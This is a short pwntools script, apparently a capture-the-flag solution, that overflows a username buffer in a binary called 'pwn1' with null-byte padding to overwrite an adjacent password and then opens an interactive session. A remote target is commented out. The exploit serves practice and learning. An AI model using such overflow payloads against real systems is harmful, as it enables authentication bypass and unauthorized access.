from pwn import *

binary = './pwn1'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('10.10.23.57', 1337)

r.sendlineafter(b'Username: ', flat([
    b'bytereaper'.ljust(112, b'\x00'),
    b'5up3rP4zz123Byte\x00'
]))

r.interactive()
